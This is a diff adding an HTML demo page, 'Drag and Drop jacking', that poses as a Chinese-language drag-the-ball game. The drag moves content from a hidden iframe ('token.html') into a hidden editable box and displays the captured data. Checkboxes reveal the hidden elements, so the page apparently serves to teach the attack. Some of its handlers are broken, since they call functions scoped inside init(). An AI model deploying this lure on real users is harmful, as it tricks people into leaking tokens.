@@ -1,0 +1,185 @@
+<!--
+ * @Date         : 2024-04-28 23:37:45 星期0
+ * @Author       : xut
+ * @Description  : 
+-->
+<!doctype html>
+<html lang="zh">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Drag and Drop jacking</title>
+    <style>
+      #source {
+        height: 50px;
+        width: 50px;
+        top: 360px;
+        left: 565px;
+        overflow: hidden;
+        opacity: 0.3;
+        position: absolute;
+        border: 1px solid gray;
+      }
+      .text_area_hidden {
+        height: 50px;
+        width: 50px;
+        top: 130px;
+        left: 875px;
+        border: 1px solid black;
+        overflow: hidden;
+        opacity: 0.3;
+        position: absolute;
+      }
+      #hide_ball {
+        width: 50px;
+        position: absolute;
+        top: 350px;
+        left: 550px;
+      }
+      #hide_ball_1 {
+        width: 50px;
+        top: 132px;
+        left: 875px;
+        opacity: 0.2;
+        position: absolute;
+      }
+      #dolphin {
+        width: 280px;
+        top: 180px;
+        left: 800px;
+        position: absolute;
+      }
+      .center {
+        margin-right: auto;
+        margin-left: auto;
+        vertical-align: middle;
+        text-align: center;
+        margin-top: 400px;
+      }
+    </style>
+  </head>
+  <body onload="init()">
+    <center>
+      <h1>Drag and Drop jacking</h1>
+      <p>
+        游戏规则：“Ctrl + A” 或滑动鼠标选中小球，然后把小球拖放到海豚的嘴上。
+      </p>
+    </center>
+    <img id="hide_ball" src="./ball.png" alt="ball" />
+    <iframe
+      id="source"
+      src="./token.html"
+      scrolling="no"
+      frameborder="0"
+      class="iframe_hidden"
+    ></iframe>
+    <img id="dolphin" src="./dolphin.png" alt="dolphin" />
+    <img id="hide_ball_1" src="./ball.png" alt="ball" />
+    <div>
+      <div id="target" class="text_area_hidden" contenteditable="true">
+        test
+      </div>
+    </div>
+    <div
+      id="info"
+      style="
+        position: absolute;
+        background-color: #e0e0e0;
+        font-weight: bold;
+        top: 600px;
+      "
+    ></div>
+    <br />
+    <div class="center">
+      <center>
+        <input
+          type="checkbox"
+          id="showHide_frame"
+          onclick="showHide_frame.call(this)"
+        />
+        <label for="showHide_frame">Show the jacked iframe</label>
+        |
+        <input
+          type="checkbox"
+          id="showHide_text"
+          onclick="showHide_text.call(this)"
+        />
+        <label for="showHide_text">Show the jacked Textarea</label>
+        |
+        <input
+          type="button"
+          value="Replay"
+          onclick="location.reload();reload_text();"
+        />
+      </center>
+      <br />
+      <br />
+      <b>Design by xut</b>
+    </div>
+    <script>
+      function init() {
+        const source = document.getElementById("source")
+        const target = document.getElementById("target")
+
+        target.addEventListener("drop", dumpInfo, false)
+
+        function entities(s) {
+          let e = {
+            '"': "&quot;",
+            "&": "&amp;",
+            "<": "&lt;",
+            ">": "&gt;",
+          }
+
+          return s.replace(/["&<>]/g, function (m) {
+            return e[m]
+          })
+        }
+
+        function dumpInfo(event) {
+          console.log(
+            "🚀 ~ dumpInfo ~ event:",
+            event.dataTransfer.getData("text/html")
+          )
+          showHide_ball.call(this) // 地面上的小球消失
+          showHide_ball_1.call(this) // 海豚嘴上的小球出现
+
+          const info = document.getElementById("info")
+          info.innerHTML +=
+            "<span style='color:#3355cc;font-size:12px'>" +
+            entities(event.dataTransfer.getData("text/html")) +
+            "</span><br>"
+        }
+
+        function html() {
+          target.innerText = target.innerHTML
+          const info = document.getElementById("info")
+          info.innerHTML +=
+            "<span style='color:#3355cc;font-size:12px'>" +
+            target.innerHTML +
+            "</span><br>"
+        }
+
+        function showHide_frame() {
+          const iframe = document.getElementById("iframe_hidden")
+          iframe.style.opacity = this.checked ? "0.5" : "0"
+        }
+        function showHide_text() {
+          const text = document.getElementById("target")
+          text.style.opacity = this.checked ? "0.5" : "0"
+        }
+        function showHide_ball() {
+          const hide_ball = document.getElementById("hide_ball")
+          hide_ball.style.opacity = "0"
+        }
+        function showHide_ball_1() {
+          const hide_ball_1 = document.getElementById("hide_ball_1")
+          hide_ball_1.style.opacity = "1"
+        }
+        function reload_text() {
+          target.value = ""
+        }
+      }
+    </script>
+  </body>
+</html>
